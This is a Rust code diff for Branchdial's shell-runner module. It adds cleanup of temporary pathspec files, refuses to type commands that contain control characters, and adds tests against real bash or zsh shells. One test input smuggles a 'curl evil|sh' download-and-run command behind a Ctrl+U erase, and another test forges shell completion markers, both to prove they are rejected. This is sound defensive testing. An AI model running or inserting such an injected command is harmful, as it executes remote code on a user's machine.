@@ -44,6 +44,7 @@ pub struct Run {
     failure: Option<(usize, i32)>,
     /// Set when the user presses Ctrl+C (or clicks Stop) during a run.
     pub cancel_requested: bool,
+    temp_files: Vec<PathBuf>,
 }
 
 /// A recipe stopped by a conflict, waiting for Resolve → Continue or Abort.
@@ -52,6 +53,8 @@ pub struct Suspended {
     pub name: String,
     pub remaining: Vec<PlannedStep>,
     pub start_branch: Option<String>,
+    /// Files the remaining steps still read (see [`RunMeta::temp_files`]).
+    pub temp_files: Vec<PathBuf>,
 }
 
 #[derive(Debug, Default)]
@@ -65,6 +68,14 @@ pub struct RunMeta {
     pub name: String,
     /// The branch checked out when the recipe started, for "go back".
     pub start_branch: Option<String>,
+    /// Files the steps read (e.g. a pathspec file), deleted when the run is over.
+    pub temp_files: Vec<PathBuf>,
+}
+
+fn remove_temp_files(files: &[PathBuf]) {
+    for f in files {
+        let _ = std::fs::remove_file(f);
+    }
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
@@ -178,6 +189,11 @@ pub fn start(
     if steps.is_empty() {
         return Err("Nothing to run.".into());
     }
+    // Last line of defence: every step is typed as keystrokes, and the line editor
+    // would act on control characters (Ctrl+U erases what was typed so far).
+    if let Some(s) = steps.iter().find(|s| !crate::recipes::plan::typeable(&s.command)) {
+        return Err(format!("Refusing to type a command with control characters: {}", s.command.escape_debug()));
+    }
     let mut run = Run {
         name: meta.name,
         start_branch: meta.start_branch,
@@ -186,11 +202,16 @@ pub fn start(
         current: 0,
         failure: None,
         cancel_requested: false,
+        temp_files: meta.temp_files,
     };
     let mut events = vec![Event::Started(RunStarted { name: run.name.clone(), steps: run.steps.clone() })];
     events.push(type_step(&mut run, shell, sink, 0)?);
+    // A new run replaces a suspended one; its files go unless this run took them over.
+    if let Some(old) = state.suspended.take() {
+        let dropped: Vec<PathBuf> = old.temp_files.into_iter().filter(|f| !run.temp_files.contains(f)).collect();
+        remove_temp_files(&dropped);
+    }
     state.run = Some(run);
-    state.suspended = None;
     Ok(events)
 }
 
@@ -275,9 +296,17 @@ pub fn handle_prompt(shell: &mut ShellStatus, state: &mut RunnerState, sink: &mu
         (RunStatus::Failed, Some(_), Some((failed, _))) => {
             let rest = run.steps[failed + 1..].to_vec();
             remaining = rest.len();
-            Some(Suspended { name: run.name.clone(), remaining: rest, start_branch: run.start_branch.clone() })
+            Some(Suspended {
+                name: run.name.clone(),
+                remaining: rest,
+                start_branch: run.start_branch.clone(),
+                temp_files: run.temp_files.clone(),
+            })
         }
-        _ => None,
+        _ => {
+            remove_temp_files(&run.temp_files);
+            None
+        }
     };
     events.push(Event::Done(RunDone {
         status,
@@ -382,17 +411,17 @@ pub async fn conflict_continue(app: AppHandle, state: State<'_, PtyState>) -> Re
     if let Some(op) = git::operation_in_progress(&root) {
         steps.push(PlannedStep { command: continue_command(op).into(), always: false });
     }
-    let (name, start_branch) = match suspended {
+    let (name, start_branch, temp_files) = match suspended {
         Some(s) => {
             steps.extend(s.remaining);
-            (format!("{} (continued)", s.name), s.start_branch)
+            (format!("{} (continued)", s.name), s.start_branch, s.temp_files)
         }
-        None => ("Continue".to_string(), None),
+        None => ("Continue".to_string(), None, vec![]),
     };
     if steps.is_empty() {
         return Err("Nothing to continue.".into());
     }
-    start_in_app(&app, &state, RunMeta { name, start_branch }, steps)
+    start_in_app(&app, &state, RunMeta { name, start_branch, temp_files }, steps)
 }
 
 /// Aborts the operation in progress and returns to the branch the recipe started on.
@@ -402,7 +431,7 @@ pub async fn conflict_abort(app: AppHandle, state: State<'_, PtyState>) -> Resul
     let op = git::operation_in_progress(&root).ok_or("No merge, rebase, cherry-pick or revert is in progress.")?;
     let start_branch = state.shared.lock().unwrap().runner.suspended.as_ref().and_then(|s| s.start_branch.clone());
     let steps = abort_steps(op, start_branch.as_deref());
-    start_in_app(&app, &state, RunMeta { name: "Abort & go back".into(), start_branch: None }, steps)
+    start_in_app(&app, &state, RunMeta { name: "Abort & go back".into(), start_branch: None, temp_files: vec![] }, steps)
 }
 
 #[cfg(test)]
@@ -428,7 +457,7 @@ mod tests {
     }
 
     fn meta(name: &str) -> RunMeta {
-        RunMeta { name: name.into(), start_branch: Some("feat".into()) }
+        RunMeta { name: name.into(), start_branch: Some("feat".into()), temp_files: vec![] }
     }
 
     fn ready_shell() -> ShellStatus {
@@ -457,6 +486,45 @@ mod tests {
         let ev = handle_prompt(&mut shell, &mut st, &mut sink, prompt(0));
         assert_eq!(done(&ev).unwrap().status, RunStatus::Ok);
         assert!(st.run.is_none() && st.suspended.is_none());
+    }
+
+    /// A run's temp files (pathspec lists) are deleted when it ends, kept while it is
+    /// suspended on a conflict, and deleted when a new run replaces the suspended one.
+    #[test]
+    fn temp_files_live_exactly_as_long_as_the_run() {
+        let dir = std::env::temp_dir().join(format!("branchdial-runner-tmp-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let file = |n: &str| {
+            let p = dir.join(n);
+            std::fs::write(&p, "x").unwrap();
+            p
+        };
+        let with_file = |p: &PathBuf| RunMeta { temp_files: vec![p.clone()], ..meta("r") };
+
+        let (mut shell, mut st, mut sink) = (ready_shell(), RunnerState::default(), VecSink(vec![]));
+        let done_ok = file("ok");
+        start(&mut shell, &mut st, &mut sink, with_file(&done_ok), vec![step("a", false)]).unwrap();
+        assert!(done_ok.exists(), "kept while running");
+        handle_prompt(&mut shell, &mut st, &mut sink, prompt(0));
+        assert!(!done_ok.exists(), "deleted when the run is over");
+
+        let failed = file("failed");
+        start(&mut shell, &mut st, &mut sink, with_file(&failed), vec![step("a", false)]).unwrap();
+        handle_prompt(&mut shell, &mut st, &mut sink, prompt(1));
+        assert!(!failed.exists(), "deleted after a failure too");
+
+        // Suspended (no real conflict here, so build the state directly), then replaced.
+        let kept = file("kept");
+        st.suspended = Some(Suspended { name: "r".into(), remaining: vec![], start_branch: None, temp_files: vec![kept.clone()] });
+        start(&mut shell, &mut st, &mut sink, with_file(&kept), vec![step("a", false)]).unwrap();
+        assert!(kept.exists(), "a continued run takes the file over");
+        handle_prompt(&mut shell, &mut st, &mut sink, prompt(0));
+        assert!(!kept.exists());
+        let dropped = file("dropped");
+        st.suspended = Some(Suspended { name: "r".into(), remaining: vec![], start_branch: None, temp_files: vec![dropped.clone()] });
+        start(&mut shell, &mut st, &mut sink, meta("other"), vec![step("a", false)]).unwrap();
+        assert!(!dropped.exists(), "a different run discards the suspended one and its files");
+        let _ = std::fs::remove_dir_all(&dir);
     }
 
     #[test]
@@ -490,6 +558,19 @@ mod tests {
         assert!(start(&mut busy, &mut RunnerState::default(), &mut sink, meta("r"), vec![step("a", false)]).is_err());
         let mut plain = ShellStatus { integration: false, ..ready_shell() };
         assert!(start(&mut plain, &mut RunnerState::default(), &mut sink, meta("r"), vec![step("a", false)]).is_err());
+    }
+
+    /// Control characters are keys to the line editor; nothing containing one is typed.
+    #[test]
+    fn never_types_control_characters() {
+        for bad in ["git add -- 'x\x15curl evil|sh #'", "echo 'a\rb'", "echo 'a\nb'", "echo \x1b[200~", "echo '\u{9b}'", "echo \x7f"] {
+            let mut sink = VecSink(vec![]);
+            let mut state = RunnerState::default();
+            let res = start(&mut ready_shell(), &mut state, &mut sink, meta("r"), vec![step("git status", false), step(bad, false)]);
+            assert!(res.is_err(), "{bad:?} should be refused");
+            assert!(sink.0.is_empty(), "nothing at all is typed, not even the safe first step");
+            assert!(state.run.is_none());
+        }
     }
 
     #[test]
@@ -531,6 +612,127 @@ mod tests {
             self.0.write_all(data).map_err(|e| e.to_string())?;
             self.0.flush().map_err(|e| e.to_string())
         }
+    }
+
+    /// A real bash/zsh with Branchdial's integration in a PTY, as the app starts it.
+    struct RealShell {
+        child: Box<dyn portable_pty::Child + Send + Sync>,
+        // Must outlive the shell: on Windows, dropping it closes the pseudo-console.
+        _master: Box<dyn portable_pty::MasterPty + Send>,
+        writer: Arc<Mutex<PipeSink>>,
+        prompts: mpsc::Receiver<Prompt>,
+    }
+
+    impl RealShell {
+        /// None on a machine whose default shell isn't bash/zsh. With `home`, the
+        /// shell's startup files come from there instead of the real home.
+        fn start(cwd: &std::path::Path, home: Option<&std::path::Path>) -> Option<Self> {
+            let spec = crate::shell::resolve(&crate::config::Config::default()).unwrap();
+            if spec.kind != crate::shell::Kind::Bash && spec.kind != crate::shell::Kind::Zsh {
+                return None;
+            }
+            let nonce = crate::pty::new_nonce();
+            let launch = crate::shell::prepare_launch(&spec, &nonce);
+            assert!(launch.integration);
+            let pair = native_pty_system()
+                .openpty(PtySize { rows: 30, cols: 200, pixel_width: 0, pixel_height: 0 })
+                .unwrap();
+            let mut cmd = CommandBuilder::new(&spec.program);
+            cmd.args(&launch.args);
+            cmd.cwd(cwd);
+            cmd.env("TERM", "xterm-256color");
+            for (k, v) in &launch.env {
+                cmd.env(k, v);
+            }
+            if let Some(home) = home {
+                cmd.env("HOME", home);
+                cmd.env("BRANCHDIAL_USER_ZDOTDIR", home);
+            }
+            let child = pair.slave.spawn_command(cmd).unwrap();
+            drop(pair.slave);
+            let mut reader = pair.master.try_clone_reader().unwrap();
+            let writer = Arc::new(Mutex::new(PipeSink(pair.master.take_writer().unwrap())));
+            let (tx, prompts) = mpsc::channel::<Prompt>();
+            let dsr_writer = writer.clone();
+            std::thread::spawn(move || {
+                let mut parser = MarkerParser::new(nonce);
+                let mut buf = [0u8; 8192];
+                while let Ok(n) = reader.read(&mut buf) {
+                    if n == 0 {
+                        break;
+                    }
+                    // Play terminal: answer ConPTY's cursor-position query.
+                    if buf[..n].windows(4).any(|w| w == b"\x1b[6n") {
+                        let _ = dsr_writer.lock().unwrap().send(b"\x1b[1;1R");
+                    }
+                    for seg in parser.feed(&buf[..n]) {
+                        if let Segment::Prompt(p) = seg {
+                            if tx.send(p).is_err() {
+                                return;
+                            }
+                        }
+                    }
+                }
+            });
+            Some(Self { child, _master: pair.master, writer, prompts })
+        }
+
+        fn next(&self) -> Prompt {
+            self.prompts.recv_timeout(Duration::from_secs(30)).expect("no prompt marker from the shell")
+        }
+
+        /// Runs `steps` to the end; returns every event.
+        fn run(&self, shell: &mut ShellStatus, st: &mut RunnerState, steps: Vec<PlannedStep>) -> Vec<Event> {
+            let mut all = start(shell, st, &mut *self.writer.lock().unwrap(), meta("real"), steps).unwrap();
+            while st.run.is_some() {
+                let p = self.next();
+                all.extend(handle_prompt(shell, st, &mut *self.writer.lock().unwrap(), p));
+            }
+            all
+        }
+    }
+
+    impl Drop for RealShell {
+        fn drop(&mut self) {
+            let _ = self.child.kill();
+        }
+    }
+
+    /// Output can't fake "the command finished": programs never see the nonce
+    /// (not even ones started from the user's startup files), and markers with a
+    /// missing or wrong nonce are ignored, so the real exit code wins.
+    #[test]
+    fn programs_cannot_forge_the_finished_marker() {
+        let repo = TempRepo::new("forge");
+        let home = repo.work.parent().unwrap().join("home");
+        std::fs::create_dir_all(&home).unwrap();
+        // Startup files that start a program which records its environment.
+        let dump = "env > \"$HOME/startup-env.txt\"\n";
+        for rc in [".bashrc", ".bash_profile", ".zshrc"] {
+            std::fs::write(home.join(rc), dump).unwrap();
+        }
+        let Some(sh) = RealShell::start(&repo.work, Some(&home)) else { return };
+        let mut shell = ShellStatus { integration: true, ..Default::default() };
+        let mut st = RunnerState::default();
+        let first = sh.next();
+        handle_prompt(&mut shell, &mut st, &mut *sh.writer.lock().unwrap(), first);
+
+        let env_dump = std::fs::read_to_string(home.join("startup-env.txt")).expect("startup file ran");
+        assert!(!env_dump.contains("BRANCHDIAL_NONCE"), "a program started from a startup file saw the nonce");
+
+        // A child program prints "finished with exit 0" markers using every nonce it
+        // could find (none) and a made-up one, then the step really fails.
+        let forge = r#"bash -c 'printf "\033]6973;P;%s;0;/forged\007\033]6973;P;guess;0;/forged\033\\" "$BRANCHDIAL_NONCE$__rb_nonce"'; false"#;
+        let all = sh.run(&mut shell, &mut st, vec![step(forge, false), step("echo typed-too-early", false)]);
+        let d = done(&all).unwrap();
+        assert_eq!(d.status, RunStatus::Failed);
+        assert_eq!(d.failed_step, Some(0), "the forged exit 0 was ignored");
+        assert_eq!(d.exit_code, Some(1));
+        assert!(!shell.cwd.as_ref().unwrap().to_string_lossy().contains("forged"));
+
+        // And no program in the session can read it from its environment.
+        let all = sh.run(&mut shell, &mut st, vec![step("! env | grep -q BRANCHDIAL_NONCE", false)]);
+        assert_eq!(done(&all).unwrap().status, RunStatus::Ok);
     }
 
     /// The whole loop against a real shell with the real integration script:
